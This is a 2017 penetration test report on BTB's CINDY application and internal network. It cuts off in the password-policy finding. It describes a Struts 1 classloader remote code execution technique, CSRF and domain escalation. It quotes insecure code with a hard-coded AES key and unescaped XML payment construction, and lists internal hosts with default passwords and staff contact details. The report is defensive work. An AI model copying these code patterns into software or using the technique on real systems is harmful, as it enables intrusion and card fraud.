<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <meta name="author" content="George Stewart">
  <meta name="dcterms.date" content="2017-11-27">
  <title>CINDY and Network Infrastructure Penetration Test Report</title>
  <style type="text/css">code{white-space: pre;}</style>
  <style type="text/css">
a.sourceLine { display: inline-block; line-height: 1.25; }
a.sourceLine { pointer-events: none; color: inherit; text-decoration: inherit; }
a.sourceLine:empty { height: 1.2em; position: absolute; }
.sourceCode { overflow: visible; }
code.sourceCode { white-space: pre; position: relative; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
code.sourceCode { white-space: pre-wrap; }
a.sourceLine { text-indent: -1em; padding-left: 1em; }
}
pre.numberSource a.sourceLine
  { position: relative; }
pre.numberSource a.sourceLine:empty
  { position: absolute; }
pre.numberSource a.sourceLine::before
  { content: attr(data-line-number);
    position: absolute; left: -5em; text-align: right; vertical-align: baseline;
    border: none; pointer-events: all;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    color: #aaaaaa;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
div.sourceCode
  {  }
@media screen {
a.sourceLine::before { text-decoration: underline; }
}
code span.al { color: #ff0000; font-weight: bold; } /* Alert */
code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { color: #7d9029; } /* Attribute */
code span.bn { color: #40a070; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
code span.ch { color: #4070a0; } /* Char */
code span.cn { color: #880000; } /* Constant */
code span.co { color: #60a0b0; font-style: italic; } /* Comment */
code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
code span.do { color: #ba2121; font-style: italic; } /* Documentation */
code span.dt { color: #902000; } /* DataType */
code span.dv { color: #40a070; } /* DecVal */
code span.er { color: #ff0000; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #40a070; } /* Float */
code span.fu { color: #06287e; } /* Function */
code span.im { } /* Import */
code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #007020; font-weight: bold; } /* Keyword */
code span.op { color: #666666; } /* Operator */
code span.ot { color: #007020; } /* Other */
code span.pp { color: #bc7a00; } /* Preprocessor */
code span.sc { color: #4070a0; } /* SpecialChar */
code span.ss { color: #bb6688; } /* SpecialString */
code span.st { color: #4070a0; } /* String */
code span.va { color: #19177c; } /* Variable */
code span.vs { color: #4070a0; } /* VerbatimString */
code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <link rel="stylesheet" href="css/template.css">
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body class="margin">
<h1 id="executive-summary">Executive Summary</h1>
<p>Building Telco Businesses (BTB) commissioned Colman Communciations to perform a penetration test against CINDY and network infrastructure. The objective of the penetration test was to assess the effectiveness of BTB’s preventative controls against attack by an adversary with credentials to CINDY, but not any other infrastructure.</p>
<p>Testing was conducted between 23 October 2017 and 6 November 2017.</p>
<h2 id="report-findings-and-vulnerability-summary">Report findings and vulnerability summary</h2>
<p>The key findings of the penetration test were:</p>
<ol>
<li>An unauthenticated remote code execution vulnerability was discovered in the CINDY application.</li>
<li>The CINDY application was hosted jointly in a cloud instance and on the internal network. There were no controls enforcing network segregation between the internally hosted instance and the workstations on the internal network.</li>
<li>Colman Communciations was able to establish domain dominance once a foothold on the internal network had been established.</li>
</ol>
<p>Below is an overview of the vulnerabilities identified by Colman Communciations during testing, grouped by priority:</p>
<div class="rating center">
<table>
<thead>
<tr class="header">
<th style="text-align: center;"><span class="urg">Urgent</span></th>
<th style="text-align: center;"><span class="high">High</span></th>
<th style="text-align: center;"><span class="med">Medium</span></th>
<th style="text-align: center;"><span class="low">Low</span></th>
<th style="text-align: center;"><span class="opt">Optional</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><span class="urg">2</span></td>
<td style="text-align: center;"><span class="high">4</span></td>
<td style="text-align: center;"><span class="med">3</span></td>
<td style="text-align: center;"><span class="low">1</span></td>
<td style="text-align: center;"><span class="opt">3</span></td>
</tr>
</tbody>
</table>
</div>
<p>A total of 22 treatments have been recommended to address them.</p>
<h2 id="systemic-analysis-and-recommendations">Systemic analysis and recommendations</h2>
<div class="rec">
<p>A critical vulnerability was discovered allowing remote unauthenticated code execution. This was caused by the usage of the struts framework version 1, which has an unpatched vulnerability that will never be addressed as the framework has been marked “end of life”. In addition to this, a list of other libraries and and their versions indicate that apache-common-collections version 3.1 is in use. This library suffers from a critical de-serialisation flaw that can result in remote code execution. However, checks of the application for evidence of serialised objects passed to the browser did not turn up any results.</p>
<ol>
<li>Update application development practices to require the use of up-to-date components.</li>
<li>Integrate a tool to monitor libraries for vulnerabilities into the build and deploy process, so that vulnerable libraries can not be pushed into production. One such open source tool is <a href="https://www.owasp.org/index.php/OWASP_Dependency_Check">OWASP Dependency Check</a>.</li>
</ol>
<p>Escalation to domain administrator privileges was made possible through the use of missing authentication, default credentials and password reuse. It is likely that had these issues not been discovered, Colman Communciations would not have been able to achieve domain dominance within the test window. It was noted that BTB seems to have a strong password policy, and it is unlikely that any passwords would have been cracked if attempted.</p>
<ol>
<li>Ensure that deployment processes require all devices have default credentials changed prior to deployment.</li>
<li>Encourage the use of password managers to avoid password re-use.</li>
<li>Reset all credentials identified in this report including credentials for the btb.local domain and KRBTGT account (which must be reset twice in quick succession). The resource https://adsecurity.org/?p=483 provides background into the operation and the resource https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51 contains a script that can assist with the process.</li>
</ol>
<p>Colman Communciations did not observe an Active Directory design that aligns with best practice. Everyday use accounts of executives had been given domain administrator privileges, and groups to support role based access control were not observed.</p>
<ol>
<li>Review the Active Directory architecture against Microsoft best-practice.</li>
</ol>
</div>
<h1 id="introduction">Introduction</h1>
<p>The objective of the penetration test was to assess the effectiveness of BTB’s preventative controls against attack by an adversary with credentials to CINDY, but not any other infrastructure.</p>
<h2 id="timeframe">Timeframe</h2>
<p>10 days of testing were allocated for this engagement. The testing was performed between 23 October 2017 and 6 November 2017.</p>
<h2 id="scope">Scope</h2>
<p>The test scope was:</p>
<ul>
<li>A penetration test of CINDY.</li>
<li>A penetration test of Internet facing infrastructure.</li>
<li>A penetration test of the internal networks.</li>
</ul>
<p>Further information can be found in the test plan btb_2017_test_plan_v1.1.pdf.</p>
<h2 id="personnel">Personnel</h2>
<p>The following individuals were involved in the testing process:</p>
<table>
<colgroup>
<col style="width: 16%" />
<col style="width: 21%" />
<col style="width: 17%" />
<col style="width: 44%" />
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">Name</th>
<th style="text-align: left;">Role</th>
<th style="text-align: left;">Phone</th>
<th style="text-align: left;">Email</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">George Stewart</td>
<td style="text-align: left;">Security Tester</td>
<td style="text-align: left;">0432 918 830</td>
<td style="text-align: left;">george.stewart@colmancomm.com</td>
</tr>
<tr class="even">
<td style="text-align: left;">Sachin Patel</td>
<td style="text-align: left;">GM - Product &amp; Technology</td>
<td style="text-align: left;">0411 655 405</td>
<td style="text-align: left;">sachin@btbaustralia.com.au</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Graham Corrigan</td>
<td style="text-align: left;">GM - Software and Architecture</td>
<td style="text-align: left;">0409 368 903</td>
<td style="text-align: left;">graham@btbaustralia.com.au</td>
</tr>
<tr class="even">
<td style="text-align: left;">Clem Colman</td>
<td style="text-align: left;">Security Consultant</td>
<td style="text-align: left;">0417 744 511</td>
<td style="text-align: left;">clem@colmancomm.com</td>
</tr>
</tbody>
</table>
<h2 id="setup">Setup</h2>
<p>Testing of CINDY was performed in a environment dedicated to the penetration test. All other testing was performed in production.</p>
<p>The testing was conducted with limited knowledge of the target. The following was supplied:</p>
<ul>
<li>Test accounts for CINDY.</li>
<li>Libraries in use by CINDY.</li>
<li>Network diagrams for the organisation.</li>
<li>An error checking feature that would disable the application for an IP after a certain threshold of errors was hit was disabled.</li>
<li>Once code execution in CINDY was proven, VPN access to the internal network was provided so that testing could continue without affecting production.</li>
</ul>
<h1 id="vulnerabilities">Vulnerabilities</h1>
<h2 id="summary">Summary</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Description</th>
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">Vulnerable libraries in use</td>
<td style="text-align: left;"><span class="rating"><span class="urg">Urgent</span></span></td>
<td style="text-align: left;">Partial</td>
</tr>
<tr class="even">
<td style="text-align: left;">Application vulnerable to Cross Site Request Forgery</td>
<td style="text-align: left;"><span class="rating"><span class="urg">Urgent</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Insecure credit card storage and encryption</td>
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="even">
<td style="text-align: left;">Missing/Default passwords</td>
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Domain Privileges</td>
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
<tr class="even">
<td style="text-align: left;">Xml Injection</td>
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Poor password security policy</td>
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="even">
<td style="text-align: left;">Functions vulnerable to SQL injection</td>
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="odd">
<td style="text-align: left;">XML External Entity Injection</td>
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="even">
<td style="text-align: left;">Missing HTTP headers</td>
<td style="text-align: left;"><span class="rating"><span class="low">Low</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
<tr class="odd">
<td style="text-align: left;">IP whitelisting not in place as stated</td>
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
<tr class="even">
<td style="text-align: left;">Business Logic Error</td>
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
<tr class="odd">
<td style="text-align: left;">Application infrastructure can be fingerprinted</td>
<td style="text-align: left;"><span class="rating"><span class="opt">Optional</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h2 id="ratings">Ratings</h2>
<p>Vulnerabilities are rated on the urgency to fix based off a combination of the ease of exploit, impact if exploited and Colman Communciations’s cyber security experience.</p>
<ul>
<li><span class="urg">Urgent</span>: The vulnerability is so severe it puts BTB at an immediate unacceptable risk and should be fixed immediately.</li>
<li><span class="high">High</span>: The vulnerability will likely put BTB at an unacceptable risk, and should be fixed as quickly as practical.</li>
<li><span class="med">Medium</span>: The vulnerability may become a serious threat to BTB, especially if combined with another. It is recommended that the vulnerability be fixed as part of the next release/change window.</li>
<li><span class="low">Low</span>: The vulnerability is not likely to become a serious threat to BTB. It is recommended that the vulnerability be fixed as part of a future release as convenient.</li>
<li><span class="opt">Optional</span>: The vulnerability is unlikely to pose even a low threat to BTB, but has been included for the sake of completeness or because it is part of best practice. BTB can use its discretion when deciding if to remediate.</li>
</ul>
<p>Vulnerability statuses have been marked based on the results of retesting:</p>
<ul>
<li><strong>Fixed</strong>: fixes for the vulnerability have been tested and confirmed effective.</li>
<li><strong>Partial</strong>: a partial or temporary fix has been put in place. A complete fix could not be implemented before completion of the engagement.</li>
<li><strong>Untested</strong>: the vulnerability could not be retested before the completion of the engagement.</li>
</ul>
<h2 id="v_vuln_comps.name" class="finding">Vulnerable libraries in use</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="urg">Urgent</span></span></td>
<td style="text-align: left;">Partial</td>
</tr>
</tbody>
</table>
<h3 id="description">Description</h3>
<p>A number of vulnerable components were identified in the application. One was exploited to get unauthenticated remote code execution on the server.</p>
<p>The version of struts in use (1.2.9) allowed for remote code execution via a vulnerabiliy which allowed Colman Communciations to modify the classloader. Specifically, the logfile location was changed to a publicly accessible directory, the extension reset to .jsp, and the log format changed to facilitate injection of JSP code via the user-agent string.</p>
<p>It is noted that the version of struts in use is no longer supported by the developer.</p>
<p>A scan of the libraries using OWASP Dependency Check identified a total of 419 vulnerabilities across 9 dependencies, with the following having a high severity:</p>
<ul>
<li>commons-beanutils-1.7.0.jar</li>
<li>commons-collections-3.1.jar</li>
<li>commons-fileupload-1.0.jar</li>
<li>mysql-connector-java-5.1.7-bin.jar</li>
<li>spring-core-4.1.6.RELEASE.jar</li>
<li>standard.jar</li>
<li>struts-1.2.9.jar</li>
</ul>
<h3 id="treatments">Treatments</h3>
<div class="treatment">
<ol>
<li>Integrate the classloader filter located at https://github.com/rgielen/struts1filter</li>
<li>Upgrade the identified libraries to their latest versions.</li>
<li>Upgrade struts to version 2 of the framework.</li>
</ol>
</div>
<p>BTB have implemented the classloader filter as suggested, which has been confirmed effective by Colman Communciations. A migration from struts to spring is planned for a future release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="###%20Test%20for%20struts%201%20classloader%20vulnerability">Test for struts 1 classloader vulnerability</a></li>
<li><a href="###%20Post%20exploitation%20of%20struts%201%20classloader">Post exploitation of struts 1 classloader</a></li>
<li><a href="####%20Libraries%20in%20use">Libraries in use</a></li>
</ul>
<h2 id="v_csrf.name" class="finding">Application vulnerable to Cross Site Request Forgery</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="urg">Urgent</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-1">Description</h3>
<p>The application is vulnerable to Cross Site Request Forgery (CSRF), which was exploited to create ‘admin’ level accounts.</p>
<p>CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the attacker’s behalf. For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, and Windows domain credentials. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.</p>
<p>OWASP makes several suggestions in regards to preventing CSRF that all come with engineering trade-offs:</p>
<ul>
<li>Checking Referrer headers: This can be an effective control when implemented correctly. However there are a number of potential draw-backs to this solution:
<ul>
<li>It relies on the presence of a referrer header, which may conflict with privacy requirements and applications that have cross origin functionality.</li>
<li>It relies on the browser to attach the referrer header correctly. Vulnerabilities have been found in browsers over time where an attacking site can manipulate the vulnerable browser into setting an incorrect referrer.</li>
</ul></li>
<li>The synchroniser token values relies on all operations being implemented as POSTs, and consumes additional memory as the synchroniser token must be stored server side with the user’s session.</li>
<li>While an elegant solution, the double submit cookie pattern does not work well for applications that make use of cross origin requests (e.g. a user interface hosted on one origin and applicaiton APIs hosted on another).</li>
<li>The encrypted token pattern relies on the selection of a suitable encryption algorithm, may be vulernable to a padding oracle attack and should have the nonce written first in the encryption string to make collision attacks more difficult.</li>
</ul>
<h3 id="treatments-1">Treatments</h3>
<div class="treatment">
<ol>
<li>Select one of the CSRF defences and apply it to all functionality that results in a server side state change.</li>
</ol>
</div>
<p>BTB have implemented referrer checking, which has been confirmed effective by Colman Communciations.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="###%20Exploit%20CSRF%20to%20gain%20access">Exploit CSRF to gain access</a></li>
</ul>
<h2 id="v_cc_enc.name" class="finding">Insecure credit card storage and encryption</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-2">Description</h3>
<p>The application employs insecure practices to store credit card data, leaving it in breach of of the Payment Card Industry Data Security Standard. If audited and found in breach by one of the credit card brands, BTB could face considerable fines and penalties.</p>
<p>A static, hard-coded key is used to encrypt credit cards:</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb1-1" data-line-number="1">  <span class="kw">private</span> <span class="dt">static</span> <span class="dt">byte</span>[] <span class="fu">encryptByteArray</span>(<span class="dt">byte</span>[] array)</a>
<a class="sourceLine" id="cb1-2" data-line-number="2">    <span class="kw">throws</span> <span class="bu">Exception</span></a>
<a class="sourceLine" id="cb1-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb1-4" data-line-number="4">    <span class="dt">byte</span>[] key = <span class="st">&quot;it176CB!7GLa3M0q&quot;</span>.<span class="fu">getBytes</span>();</a>
<a class="sourceLine" id="cb1-5" data-line-number="5">    <span class="bu">SecretKeySpec</span> desKey = <span class="kw">new</span> <span class="bu">SecretKeySpec</span>(key, <span class="st">&quot;AES&quot;</span>);</a>
<a class="sourceLine" id="cb1-6" data-line-number="6">    <span class="bu">Cipher</span> cipher = <span class="bu">Cipher</span>.<span class="fu">getInstance</span>(<span class="st">&quot;AES&quot;</span>);</a>
<a class="sourceLine" id="cb1-7" data-line-number="7">    cipher.<span class="fu">init</span>(<span class="dv">1</span>, desKey);</a>
<a class="sourceLine" id="cb1-8" data-line-number="8">    <span class="dt">byte</span>[] encryptedArray = cipher.<span class="fu">doFinal</span>(array);</a>
<a class="sourceLine" id="cb1-9" data-line-number="9">    <span class="kw">return</span> encryptedArray;</a>
<a class="sourceLine" id="cb1-10" data-line-number="10">  }</a></code></pre></div>
<p>The application appeared to store CVV numbers unencrypted.</p>
<figure>
<img src="images/credit_card_details_stored.png" title="Credit card details stored in CINDY" alt="credit_card_details_stored.png" /><figcaption>credit_card_details_stored.png</figcaption>
</figure>
<p>These issues are both automatic fails should the organisation be audited against the Payment Card Industry Data Security Standard.</p>
<h3 id="treatments-2">Treatments</h3>
<div class="treatment">
<ol>
<li>Implement a tokenised solution that does not require the storage of credit card details of CVVs.</li>
</ol>
</div>
<p>BTB have provided working source code snippets for a tokenised solution.</p>
<h3 id="references-2">References</h3>
<ul>
<li><a href="####%20Encryption">Encryption</a></li>
</ul>
<h2 id="v_dflt_pw.name" class="finding">Missing/Default passwords</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
</tbody>
</table>
<h3 id="description-3">Description</h3>
<p>A number of hosts on the internal network were found with either default credentials or no passwords configured, granting access to information stored on the host.</p>
<p>The following hosts had either default or missing passwords:</p>
<ul>
<li>10.3.11.11</li>
<li>10.3.11.12</li>
<li>10.3.11.13</li>
<li>10.3.11.14</li>
<li>10.3.11.16</li>
<li>10.3.11.17</li>
<li>10.3.11.18</li>
</ul>
<p>The underlying accounts had clear-text credentials that were reused to compromise other hosts on the network including:</p>
<ul>
<li>The primary development server;</li>
<li>An executive’s email account; and</li>
<li>A domain administrator account.</li>
</ul>
<p>It was observed (but not tested), that compromise of these hosts could have been leveraged to compromise a Salesforce account with full privileges for BTB.</p>
<h3 id="treatments-3">Treatments</h3>
<div class="treatment">
<ol>
<li>Set passwords for all the hosts identified above for VNC and the “pi” account.</li>
<li>Set up service accounts when credentials must be saved to disk as part of a script, and ensure they have the minimum access required to fulfil their purpose.</li>
</ol>
</div>
<p>BTB have stated that all Raspberry PIs have had their passwords changed and VNC passwords added. All scripts have been removed from the Raspberry PIs and logins for Salesforce use an account with minimum privileges.</p>
<h3 id="references-3">References</h3>
<ul>
<li><a href="###%20Test%20Raspberry%20PI%20devices">Test Raspberry PI devices</a></li>
<li><a href="###%20Pivot%20onto%20developer%20machine">Pivot onto developer machine</a></li>
<li><a href="###%20Pivot%20onto%20NAS%20server%20and%20achieve%20domain%20administrator%20privileges">Pivot onto NAS server and achieve domain administrator privileges</a></li>
</ul>
<h2 id="v_dom_privs.name" class="finding">Domain Privileges</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Untested</td>
</tr>
</tbody>
</table>
<h3 id="description-4">Description</h3>
<p>A number of issues were found with the members of the domain admins group increasing the ease with which the domain could be compromised.</p>
<p>An image of the members of domain admins is below:</p>
<figure>
<img src="images/list_of_domain_admins.png" title="List of Domain Admins" alt="domain_administrators.png" /><figcaption>domain_administrators.png</figcaption>
</figure>
<p>The issues are:</p>
<ul>
<li>Domain admin accounts had been granted to people’s everyday use accounts. If compromised, for example as part of a spear phishing campaign, the entire domain would be instantly compromised.</li>
<li>A number of service accounts had been granted domain administrator privileges. This is almost never necessary as the accounts will often only need to run on a small number of servers.</li>
<li>A generic domain account, b2badmin, that is shared by other members of the organisation was identified. This reduces accountability within the domain should the account be used for malicious purposes.</li>
</ul>
<h3 id="treatments-4">Treatments</h3>
<div class="treatment">
<ol>
<li>Set up separate accounts for domain administration and everyday use.</li>
<li>Rationalise service accounts so they have least privilege.</li>
<li>Eliminate all shared accounts</li>
</ol>
</div>
<h3 id="references-4">References</h3>
<ul>
<li><a href="###%20Pivot%20onto%20NAS%20server%20and%20achieve%20domain%20administrator%20privileges">Pivot onto NAS server and achieve domain administrator privileges</a></li>
<li><a href="###%20Achieve%20domain%20dominance">Achieve domain dominance</a></li>
</ul>
<h2 id="v_xmli.name" class="finding">Xml Injection</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="high">High</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-5">Description</h3>
<p>The application is vulnerable to XML injection, which could be exploited to perform fraudulent credit card transactions.</p>
<p>In NABPayment.class the makePayment function uses string concatenation to build the XML request for payment without any attempt to XML escape the input.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><a class="sourceLine" id="cb2-1" data-line-number="1"></a>
<a class="sourceLine" id="cb2-2" data-line-number="2"><span class="kw">public</span> BillPaymentResult <span class="fu">makePayment</span>(Money amountPaid, <span class="bu">String</span> cardNumber, <span class="bu">String</span> cvv, <span class="bu">String</span> expiryMonth, <span class="bu">String</span> expiryYear, <span class="bu">String</span> name, <span class="bu">String</span> cidn, <span class="bu">String</span> billId, SystemParamService systemParamService)</a>
<a class="sourceLine" id="cb2-3" data-line-number="3">  {</a>
<a class="sourceLine" id="cb2-4" data-line-number="4">    <span class="bu">String</span> xmlString = <span class="st">&quot;&lt;?xml version=</span><span class="sc">\&quot;</span><span class="st">1.0</span><span class="sc">\&quot;</span><span class="st"> encoding=</span><span class="sc">\&quot;</span><span class="st">UTF-8</span><span class="sc">\&quot;</span><span class="st">?&gt;&lt;NABTransactMessage&gt;&lt;MessageInfo&gt;&lt;timeoutValue&gt;60&lt;/timeoutValue&gt;&lt;apiVersion&gt;xml-4.2&lt;/apiVersion&gt;&lt;/MessageInfo&gt;&lt;MerchantInfo&gt;  &lt;merchantID&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-5" data-line-number="5">    </a>
<a class="sourceLine" id="cb2-6" data-line-number="6">      <span class="bu">System</span>.<span class="fu">getProperty</span>(<span class="st">&quot;nabMerchant&quot;</span>) + </a>
<a class="sourceLine" id="cb2-7" data-line-number="7">      <span class="st">&quot;&lt;/merchantID&gt;  &lt;password&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-8" data-line-number="8">      <span class="bu">System</span>.<span class="fu">getProperty</span>(<span class="st">&quot;nabPassword&quot;</span>) + </a>
<a class="sourceLine" id="cb2-9" data-line-number="9">      <span class="st">&quot;&lt;/password&gt; &lt;/MerchantInfo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-10" data-line-number="10">      <span class="st">&quot;&lt;RequestType&gt;Payment&lt;/RequestType&gt;&lt;Payment&gt;&lt;TxnList count=</span><span class="sc">\&quot;</span><span class="st">1</span><span class="sc">\&quot;</span><span class="st">&gt;&lt;Txn ID=</span><span class="sc">\&quot;</span><span class="st">1</span><span class="sc">\&quot;</span><span class="st">&gt;&lt;txnType&gt;0&lt;/txnType&gt;&lt;txnSource&gt;23&lt;/txnSource&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-11" data-line-number="11">      <span class="st">&quot;&lt;amount&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-12" data-line-number="12">      amountPaid.<span class="fu">getCents</span>() + </a>
<a class="sourceLine" id="cb2-13" data-line-number="13">      <span class="st">&quot;&lt;/amount&gt;&lt;currency&gt;AUD&lt;/currency&gt;&lt;CreditCardInfo&gt;&lt;cardNumber&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-14" data-line-number="14">      cardNumber + </a>
<a class="sourceLine" id="cb2-15" data-line-number="15">      <span class="st">&quot;&lt;/cardNumber&gt;&lt;cvv&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-16" data-line-number="16">      cvv + </a>
<a class="sourceLine" id="cb2-17" data-line-number="17">      <span class="st">&quot;&lt;/cvv&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-18" data-line-number="18">      <span class="st">&quot;&lt;expiryDate&gt;&quot;</span> + (</a>
<a class="sourceLine" id="cb2-19" data-line-number="19">      expiryMonth.<span class="fu">length</span>() &lt; <span class="dv">2</span> ? <span class="st">&quot;0&quot;</span> + expiryMonth : expiryMonth) + </a>
<a class="sourceLine" id="cb2-20" data-line-number="20">      <span class="st">&quot;/&quot;</span> + (</a>
<a class="sourceLine" id="cb2-21" data-line-number="21">      expiryYear.<span class="fu">length</span>() == <span class="dv">4</span> ? expiryYear.<span class="fu">substring</span>(<span class="dv">2</span>) : </a>
<a class="sourceLine" id="cb2-22" data-line-number="22">      expiryYear) + </a>
<a class="sourceLine" id="cb2-23" data-line-number="23">      <span class="st">&quot;&lt;/expiryDate&gt;&lt;cardHolderName&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-24" data-line-number="24">      name.<span class="fu">replaceAll</span>(<span class="st">&quot;&amp;&quot;</span>, <span class="st">&quot;&amp;amp;&quot;</span>) + </a>
<a class="sourceLine" id="cb2-25" data-line-number="25">      <span class="st">&quot;&lt;/cardHolderName&gt;&lt;recurringflag&gt;no&lt;/recurringflag&gt; &quot;</span> + </a>
<a class="sourceLine" id="cb2-26" data-line-number="26">      <span class="st">&quot;&lt;purchaseOrderNo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-27" data-line-number="27">      cidn + </a>
<a class="sourceLine" id="cb2-28" data-line-number="28">      <span class="st">&quot;:&quot;</span> + </a>
<a class="sourceLine" id="cb2-29" data-line-number="29">      billId + </a>
<a class="sourceLine" id="cb2-30" data-line-number="30">      <span class="st">&quot;&lt;/purchaseOrderNo&gt;&quot;</span> + </a>
<a class="sourceLine" id="cb2-31" data-line-number="31">      <span class="st">&quot;&lt;/CreditCardInfo&gt;&lt;/Txn&gt;&lt;/TxnList&gt;&lt;/Payment&gt;&lt;/NABTransactMessage&gt;&quot;</span>;</a></code></pre></div>
<p>The same issue was discovered in NABPaymentIndividualDD.class.</p>
<p>As these functions are related to payments, these weaknesses may be exploited to modify payment information and commit fraud.</p>
<p>BTB have stated the functions are no longer in use.</p>
<h3 id="treatments-5">Treatments</h3>
<div class="treatment">
<ol>
<li>Ensure that variables are XML escaped before concatenation into the XML request by either:
<ul>
<li>making use of an XML library to generate the query, such as org.w3c.sax, org.w3c.dom or JDom; or</li>
<li>use StringEscapeUtils from the Apache Commons Lang to escape each string before it’s concatenated into the query.</li>
</ul></li>
<li>Render the function in-operable or delete it if it’s no longer required.</li>
</ol>
</div>
<p>BTB state that they have either escaped all variables to XML requests using the method StringUtil.escapeXMLReservedCharacters() or depricated the function. They have provided code snippets as evidence.</p>
<h3 id="references-5">References</h3>
<ul>
<li><a href="####%20XML%20Injection">XML Injection</a></li>
</ul>
<h2 id="v_pass_sec_pol.name" class="finding">Poor password security policy</h2>
<table>
<thead>
<tr class="header">
<th style="text-align: left;">Rating</th>
<th style="text-align: left;">Status</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;"><span class="rating"><span class="med">Medium</span></span></td>
<td style="text-align: left;">Fixed</td>
</tr>
</tbody>
</table>
<h3 id="description-6">Description</h3>
<p>Several issues were discovered with password security:</p>
<ul>
<li>Passwords were not encrypted inside the application database. If the database is recovered by an adversary, they will have access to all users accounts, and may be able to reuse the passwords on other applications.</li>
